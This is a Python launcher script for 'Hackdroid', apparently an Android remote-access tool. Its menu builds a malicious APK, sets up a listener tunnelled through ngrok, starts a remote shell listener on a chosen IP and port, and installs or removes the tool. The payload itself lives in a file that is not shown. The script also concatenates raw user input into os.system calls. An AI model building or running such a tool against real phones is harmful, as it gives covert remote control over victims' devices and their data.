import os

banner = """\033[1m\033[91m
                    _           _____         _______
██╗  ██╗ █████╗  ██████╗██╗  ██╗██████╗ ██████╗  ██████╗ ██╗██████╗ 
██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔══██╗██╔══██╗██╔═══██╗██║██╔══██╗
███████║███████║██║     █████╔╝ ██║  ██║██████╔╝██║   ██║██║██║  ██║
██╔══██║██╔══██║██║     ██╔═██╗ ██║  ██║██╔══██╗██║   ██║██║██║  ██║
██║  ██║██║  ██║╚██████╗██║  ██╗██████╔╝██║  ██║╚██████╔╝██║██████╔╝
╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝╚═════╝ 

                                       \033[93m- By TUSHAR GAUR
"""

home = "[1] Android APK & Listner Builder (NGROK)\n [2] BUILD ANDROID APK\n [3] Start Listner\Shell\n [4] Install Requirements\n [5] Unistall Hackdroid\n [6] Quit\n"
run = 1
while run == 1:
    print(banner,"\n",home)
    user_input = input("\n $>> ")
    if user_input == '1':
        port = input("ENTER PORT NUMBER: ")
        os.system("python hackdroid.py --build --ngrok -p " + port )
        
    if user_input == '2':
        ip = input("ENTER IP ADDRESS : ")
        port = input("ENTER PORT NUMBER: ")
        os.system("python hackdroid.py --build -i " + ip +" -p " + port)

    if user_input == '3':
        ip = input("ENTER IP ADDRESS : ")
        port = input("ENTER PORT NUMBER: ")
        os.system("python hackdroid.py --shell -i " + ip +" -p " + port)

    if user_input == '4':
        print("[-] Please Install JDK 11\n[-] To Run Ngrok Please Visit Ngrok's Website And Add Authtoken")
        input("\nPress Enter to install Python Requirments ")
        os.system("pip install -r requirements.txt")

    if user_input == '5':
        print("Type YES to uninstall hackdroid\n")
        conff = input(">> ")
        if conff == 'yes' or conff == 'YES':
            os.system("RMDIR /S /Q main")
            os.system("DEL hackdroid.py")
            os.system("DEL utils.py")
            os.system("DEL requirements.txt")
            os.system("DEL start.py")
            run = 0
        else:
            continue

    if user_input == '6':
        run = 0